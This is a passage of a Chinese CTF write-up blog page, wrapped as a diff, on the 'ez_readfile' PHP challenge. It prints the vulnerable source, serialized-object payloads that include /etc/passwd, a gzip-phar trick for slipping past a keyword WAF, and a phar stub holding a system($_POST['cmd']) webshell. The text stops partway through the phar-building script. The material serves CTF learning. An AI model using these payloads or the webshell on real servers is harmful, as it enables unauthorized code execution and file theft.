@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><!-- Run before styles and content so the saved theme is applied on first paint. --><script>
+  (() => {
+    let saved = null;
+    try {
+      saved = window.localStorage.getItem('theme');
+    } catch {
+      // Storage may be blocked; the system preference still works.
+    }
+    const theme = saved === 'dark' || saved === 'light'
+      ? saved
+      : window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    document.documentElement.dataset.theme = theme;
+    document.documentElement.classList.add('js');
+
+    // Set the client configuration before the asynchronous Giscus script runs.
+    const updateGiscusScripts = () => {
+      document.querySelectorAll('script[src="https://giscus.app/client.js"]').forEach((script) => {
+        script.setAttribute('data-theme', document.documentElement.dataset.theme || theme);
+      });
+    };
+    const observer = new MutationObserver(updateGiscusScripts);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+    document.addEventListener('DOMContentLoaded', () => {
+      updateGiscusScripts();
+      observer.disconnect();
+    }, { once: true });
+  })();
+</script><meta name="description" content="unserialize 入口只有 52 字符，waf 又封了 phar 关键字。把 phar 压成 gzip 绕过，再用 cp 的 -L 参数注入把 root 的 flag 复制出来。"><meta name="author" content="yyg"><meta name="theme-color" content="#f5f7fa" media="(prefers-color-scheme: light)"><meta name="theme-color" content="#10161d" media="(prefers-color-scheme: dark)"><meta property="og:site_name" content="yyg"><meta property="og:title" content="CTF Web 进阶三题（三）—— ez_readfile：phar.gz 绕 waf + cp 参数注入 · yyg"><meta property="og:description" content="unserialize 入口只有 52 字符，waf 又封了 phar 关键字。把 phar 压成 gzip 绕过，再用 cp 的 -L 参数注入把 root 的 flag 复制出来。"><meta property="og:image" content="https://yangpeter26-bot.github.io/avatar-yyg.jpg"><meta property="og:image:alt" content="yyg 的头像"><meta property="og:url" content="https://yangpeter26-bot.github.io/posts/ctf-web-advanced-3-ez-readfile/"><meta property="og:type" content="article"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2026-10-25"><meta name="twitter:card" content="summary"><title>CTF Web 进阶三题（三）—— ez_readfile：phar.gz 绕 waf + cp 参数注入 · yyg</title><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://yangpeter26-bot.github.io/posts/ctf-web-advanced-3-ez-readfile/"><link rel="alternate" type="application/rss+xml" title="yyg RSS" href="https://yangpeter26-bot.github.io/rss.xml"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CTF Web 进阶三题（三）—— ez_readfile：phar.gz 绕 waf + cp 参数注入","datePublished":"2026-10-25","keywords":"Security, CTF, Web","author":{"@type":"Person","name":"yyg","url":"https://yangpeter26-bot.github.io/posts/about/"},"description":"unserialize 入口只有 52 字符，waf 又封了 phar 关键字。把 phar 压成 gzip 绕过，再用 cp 的 -L 参数注入把 root 的 flag 复制出来。","url":"https://yangpeter26-bot.github.io/posts/ctf-web-advanced-3-ez-readfile/","image":"https://yangpeter26-bot.github.io/avatar-yyg.jpg","inLanguage":"zh-CN"}</script><link rel="stylesheet" href="/_astro/archive.RteHTq5J.css">
+<link rel="stylesheet" href="/_astro/_slug_.BrXo20_Y.css"></head> <body data-astro-cid-sckkx6r4> <a class="skip-link" href="#main-content" data-astro-cid-sckkx6r4>跳到正文</a> <header class="site-header" data-astro-cid-3ef6ksr2> <nav class="navigation glass" aria-label="主导航" data-astro-cid-3ef6ksr2> <a href="/" class="brand" aria-label="yyg，返回首页" data-astro-cid-3ef6ksr2> <span class="brand-mark" aria-hidden="true" data-astro-cid-3ef6ksr2>y</span><span data-astro-cid-3ef6ksr2>yyg</span> </a> <ul class="desktop-links" data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2><a href="/" data-astro-cid-3ef6ksr2>首页</a></li><li data-astro-cid-3ef6ksr2><a href="/archive/" aria-current="page" data-astro-cid-3ef6ksr2>文章</a></li><li data-astro-cid-3ef6ksr2><a href="/posts/about/" data-astro-cid-3ef6ksr2>关于</a></li><li data-astro-cid-3ef6ksr2><a href="/posts/guestbook/" data-astro-cid-3ef6ksr2>留言</a></li> </ul> <div class="nav-actions" data-astro-cid-3ef6ksr2> <button type="button" class="nav-action search-trigger" aria-label="搜索文章" aria-haspopup="dialog" aria-controls="search-dialog" data-search-open data-astro-cid-3ef6ksr2> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><circle cx="10.8" cy="10.8" r="6.8" data-astro-cid-3ef6ksr2></circle><path d="m16 16 4.5 4.5" data-astro-cid-3ef6ksr2></path></svg> </button> <button type="button" class="nav-action theme-button" id="theme-toggle" aria-label="切换深色主题" aria-pressed="false" data-astro-cid-3ef6ksr2> <svg class="icon-moon" viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><path d="M20.5 13.5A8.5 8.5 0 0 1 10.5 3.5a8.5 8.5 0 1 0 10 10Z" data-astro-cid-3ef6ksr2></path></svg> <svg class="icon-sun" viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><circle cx="12" cy="12" r="4" data-astro-cid-3ef6ksr2></circle><path d="M12 2v2m0 16v2M2 12h2m16 0h2M4.9 4.9l1.4 1.4m11.4 11.4 1.4 1.4m0-14.2-1.4 1.4M6.3 17.7l-1.4 1.4" data-astro-cid-3ef6ksr2></path></svg> </button> <button type="button" class="nav-action menu-toggle" id="hamburger" aria-label="展开导航" aria-controls="mobile-menu" aria-expanded="false" data-astro-cid-3ef6ksr2> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><path class="menu-line-top" d="M5 8h14" data-astro-cid-3ef6ksr2></path><path class="menu-line-bottom" d="M5 16h14" data-astro-cid-3ef6ksr2></path></svg> </button> </div> <ul class="mobile-navigation glass" id="mobile-menu" hidden data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2><a href="/" data-astro-cid-3ef6ksr2>首页<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/archive/" aria-current="page" data-astro-cid-3ef6ksr2>文章<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/posts/about/" data-astro-cid-3ef6ksr2>关于<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/posts/guestbook/" data-astro-cid-3ef6ksr2>留言<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li> </ul> </nav> </header>  <main id="main-content" class="container page-main page-main--wide" tabindex="-1" data-astro-cid-sckkx6r4>  <div class="reading-progress" aria-hidden="true" data-astro-cid-gysqo7gh><span data-reading-progress data-astro-cid-gysqo7gh></span></div> <div class="reading-shell" data-astro-cid-gysqo7gh> <article class="article-panel surface" id="article-top" data-reading-article data-astro-cid-gysqo7gh> <header class="article-header" data-astro-cid-gysqo7gh> <nav class="article-breadcrumb" aria-label="当前位置" data-astro-cid-gysqo7gh> <a href="/" data-astro-cid-gysqo7gh>首页</a> <span aria-hidden="true" data-astro-cid-gysqo7gh>/</span> <a href="/archive/" data-astro-cid-gysqo7gh>文章</a> <span aria-hidden="true" data-astro-cid-gysqo7gh>/</span><a href="/series/#ctf-web-advanced" data-astro-cid-gysqo7gh>CTF Web 进阶三题</a> </nav> <p class="article-series-label" data-astro-cid-gysqo7gh>CTF Web 进阶三题 <span data-astro-cid-gysqo7gh>· 第 3 / 3 篇</span></p> <h1 class="article-title" data-astro-cid-gysqo7gh>CTF Web 进阶三题（三）—— ez_readfile：phar.gz 绕 waf + cp 参数注入</h1> <p class="article-summary" data-astro-cid-gysqo7gh>unserialize 入口只有 52 字符，waf 又封了 phar 关键字。把 phar 压成 gzip 绕过，再用 cp 的 -L 参数注入把 root 的 flag 复制出来。</p> <div class="article-meta" data-astro-cid-gysqo7gh> <time datetime="2026-10-25" data-astro-cid-gysqo7gh>2026年10月25日</time> <span class="meta-separator" aria-hidden="true" data-astro-cid-gysqo7gh></span> <span data-astro-cid-gysqo7gh>约 7 分钟读完</span> </div> <ul class="article-tags" aria-label="文章标签" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh><a href="/tags/Security/" data-astro-cid-gysqo7gh>Security</a></li><li data-astro-cid-gysqo7gh><a href="/tags/CTF/" data-astro-cid-gysqo7gh>CTF</a></li><li data-astro-cid-gysqo7gh><a href="/tags/Web/" data-astro-cid-gysqo7gh>Web</a></li> </ul> </header> <details class="mobile-toc" data-mobile-toc data-astro-cid-gysqo7gh> <summary data-astro-cid-gysqo7gh><span data-astro-cid-gysqo7gh>文章目录</span><span class="toc-count" data-astro-cid-gysqo7gh>20 个小节</span></summary> <nav aria-label="文章目录" data-astro-cid-gysqo7gh> <ol class="toc-list" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh> <a href="#一源码" data-toc-link data-astro-cid-gysqo7gh>一、源码</a> </li><li data-astro-cid-gysqo7gh> <a href="#二分诊" data-toc-link data-astro-cid-gysqo7gh>二、分诊</a> </li><li data-astro-cid-gysqo7gh> <a href="#三卡点flag-读不了" data-toc-link data-astro-cid-gysqo7gh>三、卡点：/flag 读不了</a> </li><li data-astro-cid-gysqo7gh> <a href="#四phar--gzip绕过-waf-写马" data-toc-link data-astro-cid-gysqo7gh>四、phar + gzip：绕过 waf 写马</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#41-为什么直接写-phar-不行" data-toc-link data-astro-cid-gysqo7gh>4.1 为什么直接写 phar 不行</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#42-include-一个-phar-时-php-做了什么" data-toc-link data-astro-cid-gysqo7gh>4.2 include 一个 .phar 时 PHP 做了什么</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#43-gzip-压掉关键字" data-toc-link data-astro-cid-gysqo7gh>4.3 gzip 压掉关键字</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#44-生成-phar" data-toc-link data-astro-cid-gysqo7gh>4.4 生成 phar</a> </li><li data-astro-cid-gysqo7gh> <a href="#五rce" data-toc-link data-astro-cid-gysqo7gh>五、RCE</a> </li><li data-astro-cid-gysqo7gh> <a href="#六读-flagcp-参数注入" data-toc-link data-astro-cid-gysqo7gh>六、读 flag：cp 参数注入</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#61-backupsh" data-toc-link data-astro-cid-gysqo7gh>6.1 backup.sh</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#62-思路" data-toc-link data-astro-cid-gysqo7gh>6.2 思路</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#63--展开--参数覆盖" data-toc-link data-astro-cid-gysqo7gh>6.3 * 展开 + 参数覆盖</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#64-执行" data-toc-link data-astro-cid-gysqo7gh>6.4 执行</a> </li><li data-astro-cid-gysqo7gh> <a href="#七完整流程" data-toc-link data-astro-cid-gysqo7gh>七、完整流程</a> </li><li data-astro-cid-gysqo7gh> <a href="#八踩坑" data-toc-link data-astro-cid-gysqo7gh>八、踩坑</a> </li><li data-astro-cid-gysqo7gh> <a href="#九两个可复用的-trick" data-toc-link data-astro-cid-gysqo7gh>九、两个可复用的 trick</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#91-压缩绕过关键字" data-toc-link data-astro-cid-gysqo7gh>9.1 压缩绕过关键字</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#92-cp-参数注入" data-toc-link data-astro-cid-gysqo7gh>9.2 cp 参数注入</a> </li><li data-astro-cid-gysqo7gh> <a href="#相关" data-toc-link data-astro-cid-gysqo7gh>相关</a> </li> </ol> </nav> </details> <div class="reading-content prose" id="article-content" data-reading-content data-astro-cid-gysqo7gh> <blockquote>
+<p>题目：2025 湾区杯网络安全大赛 · Web · ez_readfile（NSSCTF 复现）
+环境：PHP 7.4.33 / Apache 2.4.54 (Debian)
+考点：短序列化链、phar 反序列化、gzip 绕过关键字、<code>cp</code> 参数注入、软链接</p>
+</blockquote>
+<hr>
+<h2 id="一源码">一、源码</h2>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#94E2D5">&#x3C;?</span><span style="color:#CDD6F4">php</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">highlight_file</span><span style="color:#9399B2">(</span><span style="color:#CBA6F7">__FILE__</span><span style="color:#9399B2">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CBA6F7">function</span><span style="color:#89B4FA;font-style:italic"> waf</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC">$</span><span style="color:#EBA0AC;font-style:italic">data</span><span style="color:#9399B2">){</span></span>
+<span class="line"><span style="color:#CBA6F7">    if</span><span style="color:#9399B2"> (</span><span style="color:#89B4FA;font-style:italic">is_array</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$data</span><span style="color:#9399B2">)){</span></span>
+<span class="line"><span style="color:#CBA6F7">        die</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"Cannot transfer arrays"</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#CBA6F7">    if</span><span style="color:#9399B2"> (</span><span style="color:#89B4FA;font-style:italic">preg_match</span><span style="color:#9399B2">(</span><span style="color:#F5C2E7">'/</span><span style="color:#A6E3A1">&#x3C;</span><span style="color:#F5C2E7">\?</span><span style="color:#A6E3A1">|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data</span><span style="color:#F5C2E7">/i'</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> $data</span><span style="color:#9399B2">))</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#CBA6F7">        die</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"You can't do"</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CBA6F7">class</span><span style="color:#F9E2AF;font-style:italic"> Coral</span><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CDD6F4"> $pivot</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> __set</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC">$</span><span style="color:#EBA0AC;font-style:italic">k</span><span style="color:#9399B2">,</span><span style="color:#EBA0AC"> $</span><span style="color:#EBA0AC;font-style:italic">value</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#CDD6F4">        $k </span><span style="color:#94E2D5">=</span><span style="color:#F38BA8"> $this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">pivot</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">ctor</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">        echo</span><span style="color:#CBA6F7"> new</span><span style="color:#CDD6F4"> $k</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$value</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CBA6F7">class</span><span style="color:#F9E2AF;font-style:italic"> Nimbus</span><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CDD6F4"> $handle</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CDD6F4"> $ctor</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> __destruct</span><span style="color:#9399B2">()</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#CBA6F7">        return</span><span style="color:#F38BA8"> $this</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">handle</span><span style="color:#9399B2">();</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> __call</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC">$</span><span style="color:#EBA0AC;font-style:italic">name</span><span style="color:#9399B2">,</span><span style="color:#EBA0AC"> $</span><span style="color:#EBA0AC;font-style:italic">arg</span><span style="color:#9399B2">){</span></span>
+<span class="line"><span style="color:#CDD6F4">        $arg</span><span style="color:#9399B2">[</span><span style="color:#FAB387">1</span><span style="color:#9399B2">]</span><span style="color:#94E2D5"> =</span><span style="color:#F38BA8"> $this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">handle</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">$name</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CBA6F7">class</span><span style="color:#F9E2AF;font-style:italic"> Zephyr</span><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CDD6F4"> $target</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CDD6F4"> $payload</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> __get</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC">$</span><span style="color:#EBA0AC;font-style:italic">prop</span><span style="color:#9399B2">)</span></span>
+<span class="line"><span style="color:#9399B2">    {</span></span>
+<span class="line"><span style="color:#F38BA8">        $this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">target</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">$prop </span><span style="color:#94E2D5">=</span><span style="color:#F38BA8"> $this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">payload</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CBA6F7">class</span><span style="color:#F9E2AF;font-style:italic"> Acheron</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CDD6F4"> $mode</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#CBA6F7">    public</span><span style="color:#CBA6F7"> function</span><span style="color:#89B4FA;font-style:italic"> __destruct</span><span style="color:#9399B2">(){</span></span>
+<span class="line"><span style="color:#CDD6F4">        $data </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> $_POST</span><span style="color:#9399B2">[</span><span style="color:#FAB387">0</span><span style="color:#9399B2">];</span></span>
+<span class="line"><span style="color:#CBA6F7">        if</span><span style="color:#9399B2"> (</span><span style="color:#F38BA8">$this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">mode </span><span style="color:#94E2D5">==</span><span style="color:#A6E3A1"> 'w'</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">            waf</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$data</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#CDD6F4">            $filename </span><span style="color:#94E2D5">=</span><span style="color:#F5C2E7"> "/</span><span style="color:#A6E3A1">tmp</span><span style="color:#F5C2E7">/"</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">md5</span><span style="color:#9399B2">(</span><span style="color:#89B4FA;font-style:italic">rand</span><span style="color:#9399B2">())</span><span style="color:#94E2D5">.</span><span style="color:#A6E3A1">".phar"</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">            file_put_contents</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$filename</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> $data</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">            echo</span><span style="color:#CDD6F4"> $filename</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#9399B2">        }</span><span style="color:#CBA6F7"> else</span><span style="color:#CBA6F7"> if</span><span style="color:#9399B2"> (</span><span style="color:#F38BA8">$this</span><span style="color:#94E2D5">-></span><span style="color:#CDD6F4">mode </span><span style="color:#94E2D5">==</span><span style="color:#A6E3A1"> 'r'</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">            waf</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$data</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#CDD6F4">            $f </span><span style="color:#94E2D5">=</span><span style="color:#CBA6F7"> include</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$data</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#CBA6F7">            if</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$f</span><span style="color:#9399B2">){</span><span style="color:#89B4FA;font-style:italic"> echo</span><span style="color:#A6E3A1"> "It is file"</span><span style="color:#9399B2">;</span><span style="color:#9399B2"> }</span></span>
+<span class="line"><span style="color:#CBA6F7">            else</span><span style="color:#9399B2">{</span><span style="color:#89B4FA;font-style:italic"> echo</span><span style="color:#A6E3A1"> "You can look at the others"</span><span style="color:#9399B2">;</span><span style="color:#9399B2"> }</span></span>
+<span class="line"><span style="color:#9399B2">        }</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CBA6F7">if</span><span style="color:#9399B2">(</span><span style="color:#89B4FA;font-style:italic">strlen</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$_POST</span><span style="color:#9399B2">[</span><span style="color:#FAB387">1</span><span style="color:#9399B2">])</span><span style="color:#94E2D5"> &#x3C;</span><span style="color:#FAB387"> 52</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#CDD6F4">    $a </span><span style="color:#94E2D5">=</span><span style="color:#89B4FA;font-style:italic"> unserialize</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$_POST</span><span style="color:#9399B2">[</span><span style="color:#FAB387">1</span><span style="color:#9399B2">]);</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"><span style="color:#CBA6F7">else</span><span style="color:#9399B2">{</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">    echo</span><span style="color:#A6E3A1"> "str too long"</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"><span style="color:#94E2D5">?></span></span></code></pre>
+<h2 id="二分诊">二、分诊</h2>
+<p>三个关键事实：</p>
+<ol>
+<li><strong>入口极短</strong>：<code>$_POST[1]</code> 反序列化，但必须 <code>&#x3C; 52</code> 字符。</li>
+<li><strong>waf 只检查 <code>$_POST[0]</code></strong>，不检查 <code>$_POST[1]</code>——所以序列化串里可以随便写类名。</li>
+<li><code>Acheron</code> 是唯一有实际 IO 的类：<code>mode=w</code> 写文件（路径固定 <code>/tmp/&#x3C;md5>.phar</code>），<code>mode=r</code> 直接 <code>include($_POST[0])</code>。</li>
+</ol>
+<p>最短 payload 就是：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>O:7:"Acheron":1:{s:4:"mode";s:1:"r";}      # 37 字符</span></span></code></pre>
+<p>先拿它当文件包含用：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#CBA6F7">POST</span><span style="color:#CDD6F4"> /</span></span>
+<span class="line"><span style="color:#CDD6F4">0=/etc/passwd</span></span>
+<span class="line"><span style="color:#CDD6F4">1=O:7:"Acheron":1:</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4">s</span><span style="color:#9399B2">:</span><span style="color:#FAB387">4</span><span style="color:#CDD6F4">:</span><span style="color:#A6E3A1">"mode"</span><span style="color:#CDD6F4">;s:</span><span style="color:#FAB387">1</span><span style="color:#CDD6F4">:</span><span style="color:#A6E3A1">"r"</span><span style="color:#CDD6F4">;</span><span style="color:#9399B2">}</span></span></code></pre>
+<p>能读到 <code>/etc/passwd</code>，说明 include 通道成立。</p>
+<h2 id="三卡点flag-读不了">三、卡点：/flag 读不了</h2>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#CDD6F4">0=/flag</span></span></code></pre>
+<p>返回：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>include(/flag): failed to open stream: Permission denied</span></span></code></pre>
+<p><code>ls -la /</code> 看到：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>-r--------   1 root root   44 Oct 25 09:31 flag</span></span></code></pre>
+<p><code>0400 root</code>，www-data 读不了。所以<strong>不能直接包含</strong>，必须拿到代码执行。</p>
+<h2 id="四phar--gzip绕过-waf-写马">四、phar + gzip：绕过 waf 写马</h2>
+<h3 id="41-为什么直接写-phar-不行">4.1 为什么直接写 phar 不行</h3>
+<p>正常思路是 <code>mode=w</code> 写一个 phar（stub 里放马），再 <code>mode=r</code> 包含触发。但 waf 把关键字符串全 ban 了：</p>
+<ul>
+<li><code>&#x3C;?</code> → stub 开头就死</li>
+<li><code>__HALT_COMPILER</code> → phar 必需</li>
+<li><code>php</code> → 任何 <code>&#x3C;?php</code> 都死</li>
+<li><code>Coral|Nimbus|Zephyr|Acheron|ctor|payload</code> → 序列化元数据全死</li>
+</ul>
+<p>写进去的文件必然带这些明文，过不了 waf。</p>
+<h3 id="42-include-一个-phar-时-php-做了什么">4.2 include 一个 <code>.phar</code> 时 PHP 做了什么</h3>
+<p>这是这题最核心的知识点：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>include($file)</span></span>
+<span class="line"><span>  → zend_compile_file()</span></span>
+<span class="line"><span>    → strstr(filename, ".phar")        ← 只看文件名</span></span>
+<span class="line"><span>      → phar_open_from_filename()</span></span>
+<span class="line"><span>        → phar_open_from_fp()          ← 解析并解压</span></span>
+<span class="line"><span>          → 执行 phar 的 stub</span></span></code></pre>
+<p>两个推论：</p>
+<ol>
+<li><strong>只看文件名</strong>：只要路径里含 <code>.phar</code> 就会走 phar 解析，跟真实内容是不是 phar 无关。</li>
+<li><strong>会自动解压</strong>：phar 支持 gzip 压缩格式，<code>phar_open_from_fp</code> 遇到 gzip 会先解压再解析。</li>
+</ol>
+<h3 id="43-gzip-压掉关键字">4.3 gzip 压掉关键字</h3>
+<p>把 phar 用 gzip 压一遍，明文关键字在字节流里就消失了：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>phar 151 B  →  gz 148 B</span></span>
+<span class="line"><span>  gz 中 "&#x3C;?":            False</span></span>
+<span class="line"><span>  gz 中 "__HALT_COMPILER": False</span></span>
+<span class="line"><span>  gz 中 "php":            False</span></span></code></pre>
+<p>waf 检查的是原始字节，压缩后全部通过。</p>
+<h3 id="44-生成-phar">4.4 生成 phar</h3>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#94E2D5">&#x3C;?</span><span style="color:#CDD6F4">php</span></span>
+<span class="line"><span style="color:#9399B2;font-style:italic">// php -d phar.readonly=0 build_phar.php exp.phar</span></span>
+<span class="line"><span style="color:#CDD6F4">$p </span><span style="color:#94E2D5">=</span><span style="color:#CBA6F7"> new</span><span style="color:#F9E2AF;font-style:italic"> Phar</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$argv</span><span style="color:#9399B2">[</span><span style="color:#FAB387">1</span><span style="color:#9399B2">]);</span></span>
+<span class="line"><span style="color:#CDD6F4">$p</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">startBuffering</span><span style="color:#9399B2">();</span></span>
+<span class="line"><span style="color:#CDD6F4">$p</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">setStub</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'&#x3C;?php system($_POST["cmd"]); __HALT_COMPILER(); ?>'</span><span style="color:#9399B2">);</span></span>
